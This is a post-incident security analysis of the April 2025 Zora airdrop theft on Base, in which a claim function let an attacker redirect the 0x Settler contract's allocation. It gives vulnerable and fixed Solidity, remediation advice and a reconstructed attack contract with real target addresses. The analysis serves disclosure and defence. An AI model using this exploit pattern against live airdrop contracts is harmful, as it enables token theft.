# Zora Token Security Incident Analysis

**Business Logic Vulnerability (Composability Attack) | Base | 2025-04-24 | Loss: ~$128,000**

---

## 1. Incident Overview

| Field | Details |
|------|------|
| Project | Zora Token ($ZORA) — Base chain NFT/creator platform token |
| Chain | Base (Ethereum L2) |
| Incident Date | 2025-04-24 13:32:03 UTC |
| Loss Amount | ~$128,000 USD (5,500,777 ZORA tokens ≈ 66.74 ETH) |
| Vulnerability Type | Business Logic Error — Composability Attack |
| Attack Transaction | `0xf71a96fe83f4c182da0c3011a0541713e966a186a5157fd37ec825a9a99deda6` ([Basescan](https://basescan.org/tx/0xf71a96fe83f4c182da0c3011a0541713e966a186a5157fd37ec825a9a99deda6)) |
| Attacker Address | `0xb957Ed2F9d104984FC547a26Da744CeF68A81238` ([Basescan](https://basescan.org/address/0xb957Ed2F9d104984FC547a26Da744CeF68A81238)) |
| Vulnerable Contract | `0x0000000002ba96C69b95E32CAAB8fc38bAB8B3F8` ([ZoraTokenCommunityClaim — Basescan](https://basescan.org/address/0x0000000002ba96C69b95E32CAAB8fc38bAB8B3F8)) |
| Intermediary Contract | `0x5C9bdC801a600c006c388FC032dCb27355154cC9` ([0x Settler V1.10 — Basescan](https://basescan.org/address/0x5C9bdC801a600c006c388FC032dCb27355154cC9)) |
| Root Cause Summary | ZoraTokenCommunityClaim's `claim(address _claimTo)` function uses `msg.sender` as the allocation beneficiary, but anyone can call it on behalf of the Settler, allowing an attacker to redirect tokens allocated to the 0x Settler to their own address |

---

## 2. Vulnerability Details

### 2.1 Missing Beneficiary Validation in Claim Function (Core Vulnerability)

**Severity**: CRITICAL  
**CWE**: CWE-284 (Improper Access Control) / CWE-20 (Improper Input Validation)

The `claim(address _claimTo)` function of the Zora airdrop contract (`ZoraTokenCommunityClaim`) looks up `msg.sender`'s `allocation` and transfers it to the `_claimTo` address. There is no enforcement that `msg.sender` and `_claimTo` are the same party.

This design was intended to support contract-based beneficiaries such as multisigs and smart wallets, but it becomes a critical flaw when a **permissionless contract** (0x Settler) is included in the airdrop beneficiary list. Since 0x Settler allows anyone to trigger delegated calls by passing arbitrary calldata, an attacker can call the claim function via Settler with `msg.sender = Settler` and `_claimTo = attacker's address`, thereby stealing Settler's tokens.

#### Vulnerable Code (❌)

```solidity
// ZoraTokenCommunityClaim.sol (vulnerable version)

/// @notice Claims airdrop tokens
/// @param _claimTo Address to receive tokens — may differ from msg.sender (❌ no validation)
function claim(address _claimTo) external override {
    // No check that msg.sender == _claimTo
    // If msg.sender is a permissionless contract, anyone can call this on its behalf
    _claim(msg.sender, _claimTo);
}

/// @dev Internal claim logic
/// @param _user    Address with registered allocation (msg.sender)
/// @param _claimTo Address that will actually receive the tokens
function _claim(address _user, address _claimTo) internal {
    _checkCanClaim(); // Check claim period

    if (accountClaims[_user].allocation == 0) {
        revert NoAllocation();
    }
    if (accountClaims[_user].claimed) {
        revert AlreadyClaimed();
    }

    uint256 amount = uint256(accountClaims[_user].allocation);
    accountClaims[_user].claimed = true;

    emit Claimed(_user, _claimTo, amount); // Records _user and _claimTo separately
    // ❌ No check that _claimTo is the same as _user
    SafeERC20.safeTransfer(token, _claimTo, amount);
}
```

#### Safe Code (✅)

```solidity
// ZoraTokenCommunityClaim.sol (fixed version)

/// @notice Claims airdrop tokens — only callable by msg.sender themselves
function claim() external override {
    // ✅ Fixes _claimTo to msg.sender, blocking third-party claim delegation
    _claim(msg.sender, msg.sender);
}

/// @notice Claims to a beneficiary-specified recipient address via EIP-712 signature
/// @param _user    Signing party (actual beneficiary)
/// @param _claimTo Token recipient address
/// @param _deadline Signature expiry timestamp
/// @param _signature EIP-712 signature from the beneficiary (_user)
function claimWithSignature(
    address _user,
    address _claimTo,
    uint256 _deadline,
    bytes calldata _signature
) external override {
    // ✅ Only allows arbitrary _claimTo address if signed by the beneficiary
    _verifySignature(_user, _claimTo, _deadline, _signature);
    _claim(_user, _claimTo);
}

function _claim(address _user, address _claimTo) internal {
    _checkCanClaim();

    if (accountClaims[_user].allocation == 0) {
        revert NoAllocation();
    }
    if (accountClaims[_user].claimed) {
        revert AlreadyClaimed();
    }

    uint256 amount = uint256(accountClaims[_user].allocation);
    accountClaims[_user].claimed = true;

    emit Claimed(_user, _claimTo, amount);
    SafeERC20.safeTransfer(token, _claimTo, amount);
}
```

---

### 2.2 Registration of a Permissionless Contract as Airdrop Beneficiary

**Severity**: HIGH  
**CWE**: CWE-732 (Incorrect Permission Assignment for Critical Resource)

The Zora team registered the 0x Settler contract address (`0x5C9bdc...`) as an airdrop beneficiary in recognition of its contributions to the 0x Protocol ecosystem. However, 0x Settler is a **permissionless general-purpose contract that allows anyone to delegate arbitrary external calls**.

Registering a token allocation to a permissionless contract effectively means any party can execute a claim transaction through that contract — equivalent to "placing tokens in a public vault and distributing the key to everyone."

```solidity
// Vulnerable state: 0x Settler registered as beneficiary
// accountClaims[0x5C9bdC801a600c006c388FC032dCb27355154cC9].allocation = 5,500,777 ZORA
// Anyone can call Settler.execute() to claim this allocation

// ✅ Recommended: Validate whether beneficiary addresses are permissionless contracts before airdrop
function setAllocations(bytes32[] calldata packedData) external onlyOwner {
    for (uint256 i = 0; i < packedData.length; i++) {
        address recipient = address(uint160(uint256(packedData[i])));
        // ✅ Contract addresses require owner verification or explicit whitelisting
        if (recipient.code.length > 0) {
            // Apply separate review process for contract recipients
            require(approvedContracts[recipient], "Contract recipient not approved");
        }
    }
    // ...allocation setup logic
}
```

---

### 2.3 Arbitrary External Call Delegation by 0x Settler

**Severity**: MEDIUM (not a vulnerability in isolation — composability issue)  
**CWE**: CWE-749 (Exposed Dangerous Method or Function)

As a DEX aggregator, 0x Settler performs low-level calls to arbitrary contracts to support various token swaps. The `basicSellToPool` action passes encoded `data` as-is to the `pool` address.

```solidity
// 0x Settler (simplified structural example)
function execute(bytes calldata actions) external {
    // Parse actions and dispatch each one
    _dispatch(actions);
}

function _basicSellToPool(
    address sellToken,
    address pool,     // ← Can be set to ZoraTokenCommunityClaim address
    bytes calldata data // ← ABI-encoded claim(attacker) call data
) internal {
    // Performs a low-level call to pool
    // msg.sender = Settler, so Settler's claim allocation is executed
    (bool success, ) = pool.call(data); // ❌ Arbitrary contract call
    require(success, "call failed");
}
```

---

## 3. Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    Zora Airdrop Composability Attack                     │
└─────────────────────────────────────────────────────────────────────────┘

  [Attacker EOA]
  0xb957Ed2F...
       │
       │ ① ETH funding (preparation phase)
       │   TX: 0x2b8d34af...
       │   Relay Solver → Attacker (gas fee ETH)
       ▼
  ┌─────────────────────────┐
  │  Attacker Wallet         │
  │  0xb957Ed2F...          │
  └────────────┬────────────┘
               │
               │ ② Calls execute()
               │   actions = basicSellToPool(
               │     sellToken: ZORA address,
               │     pool: ZoraTokenCommunityClaim,
               │     data: abi.encode(claim(attacker address))
               │   )
               ▼
  ┌─────────────────────────┐
  │   0x Settler V1.10      │
  │  0x5C9bdC80...          │
  │  (Permissionless DEX    │
  │   Aggregator)           │
  └────────────┬────────────┘
               │
               │ ③ pool.call(data) low-level call
               │   msg.sender = 0x Settler
               │   data = claim(0xb957Ed2F...) encoded
               ▼
  ┌─────────────────────────────────────────────────────┐
  │   ZoraTokenCommunityClaim                           │
  │   0x00000000002ba96C...                             │
  │                                                     │
  │   claim(address _claimTo) {                         │
  │     _claim(msg.sender=Settler, _claimTo=attacker)   │
  │   }                                                 │
  │                                                     │
  │   accountClaims[Settler].allocation                 │
  │   = 5,500,777 ZORA ✓ allocation confirmed           │
  │   accountClaims[Settler].claimed = true (consumed)  │
  └────────────┬────────────────────────────────────────┘
               │
               │ ④ safeTransfer(attacker, 5,500,777 ZORA)
               │   Transfer event emitted
               ▼
  ┌─────────────────────────┐
  │   Attacker Wallet        │
  │   0xb957Ed2F...          │
  │   +5,500,777 ZORA        │
  └────────────┬────────────┘
               │
               │ ⑤ Swap ZORA → ETH
               │   via 1inch Router V6
               │   Permit & Call TX: 0xa6f0823b...
               ▼
  ┌─────────────────────────┐
  │   Attacker Wallet        │
  │   +66.74 ETH (~$128K)   │
  └────────────┬────────────┘
               │
               │ ⑥ Across Protocol bridge withdrawal
               │   TX: 0xb3e18b1a...
               │   66.74 ETH bridged Base → other chain
               ▼
  ┌─────────────────────────┐
  │   Attacker Address       │
  │   on Destination Chain   │
  │   Funds laundered        │
  └─────────────────────────┘
```

**Step-by-step Description**:

1. **[Preparation] Attacker Funding**  
   The attacker created a new Base address and received a small amount of ETH via the Relay Solver service to cover transaction gas fees.  
   Preparation TX: `0x2b8d34af1161708dee4b1edbbc33e176148d0bbb8bb237c7167ab8d357334809`

2. **[Execution] Malicious Calldata Passed to 0x Settler**  
   The attacker called the `execute()` function of 0x Settler V1.10, passing encoded `basicSellToPool` action data. In this data, the `pool` field was set to the ZoraTokenCommunityClaim address, and the `data` field was set to the ABI-encoded `claim(attacker address)` function call.

3. **[Vulnerability Trigger] Settler Delegates the Claim Function Call**  
   0x Settler performs a `pool.call(data)` low-level call, making `msg.sender = 0x Settler`. Inside ZoraTokenCommunityClaim, looking up `accountClaims[Settler]` confirmed a valid allocation of 5,500,777 ZORA.

4. **[Token Theft] ZORA Transferred to Attacker Address**  
   The claim contract executed a `safeTransfer` with `_claimTo = attacker address`, sending 5,500,777 ZORA tokens to the attacker's wallet. At this point, the entire community allocation intended for the 0x Protocol ecosystem fell into the attacker's hands.

5. **[Monetization] Swap ZORA → ETH**  
   The attacker swapped the ZORA tokens for ETH via 1inch Router V6, securing approximately 66.74 ETH (~$128,000).

6. **[Exit] Bridge Out via Across Protocol**  
   The 66.74 ETH was bridged from Base to another chain via Across Protocol to exit with the funds.  
   Bridge TX: `0xb3e18b1a591ded9fdbf3e1456df7af45c5d32e57a980e9f91cf9effd9eb66d16`

---

## 4. PoC Code Analysis

No PoC file for this incident has been registered in the DeFiHackLabs official repository, so the core attack logic has been reconstructed based on publicly available technical analysis.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ─────────────────────────────────────────────────────────────
// Interface Definitions
// ─────────────────────────────────────────────────────────────

interface IZoraTokenCommunityClaim {
    // Airdrop claim function — transfers msg.sender's allocation to _claimTo
    // Vulnerability: no validation that msg.sender == _claimTo
    function claim(address _claimTo) external;
}

interface I0xSettler {
    // 0x Settler execution entry point — actions is an ABI-encoded action array
    function execute(bytes calldata actions) external payable;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

// ─────────────────────────────────────────────────────────────
// Attack Contract (Reconstructed)
// ─────────────────────────────────────────────────────────────

contract ZoraComposabilityExploit {
    // ── Target contract addresses (Base chain) ──
    address constant ZORA_CLAIM =
        0x0000000002ba96C69b95E32CAAB8fc38bAB8B3F8;  // ZoraTokenCommunityClaim
    address constant SETTLER_V110 =
        0x5C9bdC801a600c006c388FC032dCb27355154cC9;  // 0x Settler V1.10
    address constant ZORA_TOKEN =
        0x1111111111166b7FE7bd91427724B487980aFc69; // $ZORA token (estimated)

    /// @notice Execute attack
    function attack() external {
        // ─── [Step 1] Construct malicious payload ───────────────────────────
        // Encode Settler's basicSellToPool action:
        //   - sellToken: ZORA token address (Settler pretends to sell)
        //   - pool: ZoraTokenCommunityClaim address
        //   - data: ABI-encoded claim(attacker address)
        bytes memory claimCalldata = abi.encodeWithSelector(
            IZoraTokenCommunityClaim.claim.selector,
            address(this) // ← Attacker (this contract) receives the tokens
        );

        // Encode basicSellToPool action
        // Structured according to actual 0x Settler action type ID and ABI encoding format
        bytes memory actionPayload = abi.encode(
            ZORA_TOKEN,       // sellToken
            SETTLER_V110,     // (address 0x Settler will route to as pool)
            ZORA_CLAIM,       // pool = ZoraTokenCommunityClaim
            claimCalldata     // data = claim(attacker address)
        );

        // ─── [Step 2] Trigger claim via 0x Settler ────────────
        // When Settler.execute() is called:
        //   - Settler performs ZORA_CLAIM.call(claimCalldata)
        //   - msg.sender = Settler → accountClaims[Settler].allocation is looked up
        //   - 5,500,777 ZORA is transferred to the attacker (address(this))
        I0xSettler(SETTLER_V110).execute(actionPayload);

        // ─── [Step 3] Confirm stolen ZORA ───────────────────────────
        uint256 stolen = IERC20(ZORA_TOKEN).balanceOf(address(this));
        // stolen ≈ 5,500,777 * 10^18 (in wei)

        // ─── [Step 4] Transfer to EOA (actual attack included additional swap) ──
        // In the real attack, the attacker swapped ZORA → ETH via 1inch then bridged via Across
    }
}
```

### Core Attack Mechanism Summary

```
Attacker
  └─→ Settler.execute(actions)
         │   actions = basicSellToPool(
         │     pool = ZoraTokenCommunityClaim,
         │     data = claim(attacker address).selector + abi.encode(attacker address)
         │   )
         └─→ ZoraTokenCommunityClaim.claim(attacker address)
                │   msg.sender = Settler       ← allocation 5,500,777 ZORA
                │   _claimTo   = attacker address    ← recipient address
                └─→ safeTransfer(attacker address, 5,500,777 ZORA)  ✓ Success
```

**Why did it pass validation?**

1. `accountClaims[Settler].allocation = 5,500,777 ZORA` → no `NoAllocation()` revert
2. `accountClaims[Settler].claimed = false` → no `AlreadyClaimed()` revert
3. `_claimTo = attacker` → no restrictions whatsoever (no validation logic exists)

---

## 5. CWE Classification

| CWE ID | Vulnerability Name | Affected Component | Severity |
|--------|---------|-------------|--------|
| CWE-284 | Improper Access Control | `ZoraTokenCommunityClaim.claim()` | CRITICAL |
| CWE-20 | Improper Input Validation | Missing parameter validation in `claim(address _claimTo)` | CRITICAL |
| CWE-732 | Incorrect Permission Assignment for Critical Resource | Permissionless contract registered in airdrop beneficiary list | HIGH |
| CWE-749 | Exposed Dangerous Method or Function | `0x Settler.execute()` arbitrary external call delegation | MEDIUM |
| CWE-1041 | Use of Redundant Code (unintended combination of composite/redundant logic) | Composability design conflict | MEDIUM |

### V-01: Missing Beneficiary Validation in claim() Function (CRITICAL)

- **Description**: The `claim(address _claimTo)` function transfers `msg.sender`'s token allocation to the `_claimTo` address. However, there is no logic verifying that `msg.sender == _claimTo` or that `msg.sender` has the authority to designate `_claimTo`. Consequently, a third party can impersonate `msg.sender` (via `Settler.execute()`) and redirect the victim's (`Settler`'s) allocation to an arbitrary address.
- **Impact**: All tokens allocated to the claim contract — especially allocations assigned to permissionless contracts — are susceptible to theft. In this incident, 5,500,777 ZORA (~$128,000) was stolen.
- **Attack Conditions**: (a) A permissionless contract is included in the airdrop beneficiary list, and (b) that contract is capable of delegating arbitrary external calls.

### V-02: Permissionless Contract Registered as Airdrop Beneficiary (HIGH)

- **Description**: The 0x Settler registered by the Zora team as an airdrop beneficiary is a permissionless contract designed for DEX aggregation, allowing anyone to execute arbitrary calldata via its `execute()` entry point. No review was conducted to determine whether beneficiary addresses were permissionless contracts when compiling the airdrop beneficiary list.
- **Impact**: An airdrop allocation registered to a permissionless contract is effectively "public tokens."
- **Attack Conditions**: One or more permissionless contracts are included in the airdrop beneficiary list.

### V-03: Composability Attack — Dangerous Combination of Independently Safe Systems (MEDIUM)

- **Description**: Both the Zora claim contract and 0x Settler function correctly in isolation as designed. However, when the two systems are combined under certain conditions, an exploitation path is created that the designers did not anticipate. This is called a **Composability Attack**.
- **Impact**: As composability deepens within the DeFi ecosystem, the likelihood of this type of attack increases.
- **Attack Conditions**: An interaction path exists between two independent protocols, and that interaction violates security invariants.

---

## 6. Reproducibility Assessment

| Field | Assessment |
|------|------|
| Technical Complexity | Low — single transaction, no flash loan required |
| Upfront Capital Required | None — only a small amount of ETH for gas fees |
| On-chain Preparation | None — no approve or position entry required |
| Vulnerability Detection Difficulty | Low — discoverable through analysis of claim contract source and beneficiary list |
| Same Pattern Reproducibility | **Very High** — the same vulnerability pattern can recur in similar airdrop contracts |
| Attack Detectability | Low — Blockaid detected it within 7 seconds, but this is simulation-based detection; most security systems cannot detect in real time |

**Reproduction Scenario**: The attack is immediately reproducible in any airdrop contract with the same `claim(address _claimTo)` pattern if even one entry in the beneficiary list is a permissionless DEX router, aggregator, or multi-hop contract. A full review of all beneficiary addresses before an airdrop launch is essential.

---

## 7. Remediation

### Immediate Actions

#### [Action 1] Enforce msg.sender == _claimTo in claim() Function

```solidity
// ✅ Simplest and most effective fix — base claim() function only allows msg.sender
function claim() external override {
    // Only claimable to msg.sender's own address
    _claim(msg.sender, msg.sender);
}

// ✅ For cases requiring a different recipient address: signature-based delegated claim
function claimWithSignature(
    address _user,
    address _claimTo,
    uint256 _deadline,
    bytes calldata _signature
) external override {
    require(block.timestamp <= _deadline, "Signature expired");
    // EIP-712 signature verification — only passes if signed by _user themselves
    _verifySignature(_user, _claimTo, _deadline, _signature);
    _claim(_user, _claimTo);
}
```

#### [Action 2] Pre-screen and Block Permissionless Contract Beneficiaries

```solidity
// ✅ Validate contract addresses when setting airdrop allocations
function setAllocations(bytes32[] calldata packedData) external onlyOwner {
    for (uint256 i = 0; i < packedData.length; i++) {
        (address recipient, uint96 amount) = _unpackAllocationData(packedData[i]);

        // ✅ Check if address is a contract
        if (recipient.code.length > 0) {
            // Contract recipients require prior vetting and explicit approval
            require(
                approvedContractRecipients[recipient],
                "Contract recipient requires explicit approval"
            );
        }
        accountClaims[recipient].allocation = uint96(amount);
    }
}

// Contract recipient approval (set after separate security review)
mapping(address => bool) public approvedContractRecipients;

function approveContractRecipient(address contractAddr) external onlyOwner {
    require(contractAddr.code.length > 0, "Not a contract");
    // Approve only after separately confirming the contract has its own beneficiary access control
    approvedContractRecipients[contractAddr] = true;
    emit ContractRecipientApproved(contractAddr);
}
```

#### [Action 3] Identify Permissionless Contracts and Revoke Allocations

If vulnerable allocations remain after the airdrop launch:

```solidity
// ✅ Emergency reclaim function — reclaim unclaimed permissionless contract allocations
function reclaimContractAllocation(
    address contractAddr,
    address safeDest
) external onlyOwner {
    require(contractAddr.code.length > 0, "Must be a contract");
    require(!accountClaims[contractAddr].claimed, "Already claimed");

    uint256 amount = uint256(accountClaims[contractAddr].allocation);
    require(amount > 0, "No allocation");

    // Mark allocation as consumed
    accountClaims[contractAddr].claimed = true;
    accountClaims[contractAddr].allocation = 0;

    // Transfer to safe address
    SafeERC20.safeTransfer(token, safeDest, amount);
    emit AllocationReclaimed(contractAddr, safeDest, amount);
}
```

---

### Long-term Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Missing beneficiary validation in claim() | Design `claim()` without a recipient address parameter; require EIP-712 signature for delegated claims |
| Permissionless contract registration | Introduce a security review process for all contract addresses before finalizing the airdrop beneficiary list |
| Composability risk | Identify external protocols that can interact with your contracts and test combined scenarios |
| Pre-launch real-time simulation | Apply transaction simulation monitoring via Blockaid, Tenderly, OpenZeppelin Defender, etc. |
| Phased airdrop execution | Execute large allocations in stages and retain emergency reclaim authority for the first 24 hours |
| On-chain beneficiary validation | Auto-flag contract recipients inside `setAllocations()` + multi-sig approval |

---

## 8. Lessons Learned and Implications

### 8.1 Composability Attacks: The Most Underestimated Risk in DeFi

The Zora incident is a textbook example of a **composability attack** distinct from traditional smart contract vulnerabilities. Both the Zora claim contract and 0x Settler operated normally in their own contexts. The problem was their unexpected combination.

**Implications for other protocols**:
- Before distributing airdrops or rewards, verify whether beneficiary addresses are permissionless contracts that "can be triggered by a third party without the owner's intent."
- Routers already widely used in the DeFi ecosystem (UniswapV3 Router, 1inch, 0x Settler, etc.) require particular caution. The addresses of these contracts may frequently appear in airdrop beneficiary lists.

### 8.2 The "Only Beneficiary Can Claim" Principle

The golden rule of airdrop contract design:

```
Only the beneficiary themselves (msg.sender == recipient) should be able to claim their tokens.
Delegated claims must prove authorization through the beneficiary's EIP-712 signature.
```

Violating this principle means the same attack can be reproduced in any airdrop involving contract beneficiaries. Similar patterns have appeared repeatedly — the 2023 Dexible incident (arbitrary call permissiveness), the 2024 Hedgey Finance incident, and others.

### 8.3 Pre-Launch Security Checklist

| Item | Verification Method |
|------|-----------|
| Full audit of contract addresses in airdrop beneficiary list | Verify `code.length > 0` for all beneficiary addresses |
| Permission analysis for each contract beneficiary | Investigate whether the contract allows arbitrary external calls |
| msg.sender validation in claim function | Review beneficiary confirmation logic in `claim(address)` signature |
| Emergency reclaim function implementation | Admin function for reclaiming misallocated tokens |
| Pre-launch transaction simulation monitoring setup | Blockaid, Tenderly, OpenZeppelin Defender |

### 8.4 Ecosystem-Level Lessons

This incident illustrates "the risk that arises when a contract address for Protocol B is registered in an airdrop for Protocol A." As DeFi protocols increase their interconnectivity, protocol designers must also consider what risks arise when their contracts become targets of third-party airdrops. This is a matter of **ecosystem-level risk management** that goes beyond the security responsibilities of individual protocols.

### 8.5 On-chain Verification Results

| Field | Value |
|------|------|
| Attack TX Hash | `0xf71a96fe83f4c182da0c3011a0541713e966a186a5157fd37ec825a9a99deda6` |
| Attack Block Number | 29,356,088 |
| Claimed Token Amount | 5,500,777.449190208 ZORA |
| ETH Value (after swap) | ~66.74 ETH |
| USD Value | ~$128,000 |
| Fund Exit Route | Across Protocol Bridge (Base → other chain) |
| Blockaid Detection Time | Within 7 seconds of attack execution |
| Claimed Event account | `0x5C9bdC801a600c006c388FC032dCb27355154cC9` (0x Settler) |
| Claimed Event to | `0xb957Ed2F9d104984FC547a26Da744CeF68A81238` (Attacker) |

**Event Log Sequence** (Block 29,356,088):
1. `Claimed(account=Settler, to=Attacker, amount=5500777.449...)` — ZoraTokenCommunityClaim
2. `Transfer(from=ZoraTokenCommunityClaim, to=Attacker, value=5500777.449...)` — ZORA ERC20

---

## References

- [Zora Airdrop Exploit Explained: How a Claim Logic Flaw Enabled Token Theft — Three Sigma](https://threesigma.xyz/blog/exploit/zora-airdrop-exploit-analysis)
- [Composability Attack Deep Dive: How an Attacker Stole $128k Without an Exploit — Blockaid](https://www.blockaid.io/blog/composability-attack-deep-dive-how-an-attacker-stole-128k-without-an-exploit)
- [How $75K in ZORA Was Claimed Without Hacking the Code — CoinsBench](https://coinsbench.com/how-75k-in-zora-was-claimed-without-hacking-the-code-43df4857d0cc)
- [ZoraTokenCommunityClaim Contract — Basescan](https://basescan.org/address/0x0000000002ba96C69b95E32CAAB8fc38bAB8B3F8)
- [Attack Transaction — Basescan](https://basescan.org/tx/0xf71a96fe83f4c182da0c3011a0541713e966a186a5157fd37ec825a9a99deda6)
- [Attacker Address — Basescan](https://basescan.org/address/0xb957Ed2F9d104984FC547a26Da744CeF68A81238)
- [DeFiHackLabs — SunWeb3Sec/DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs)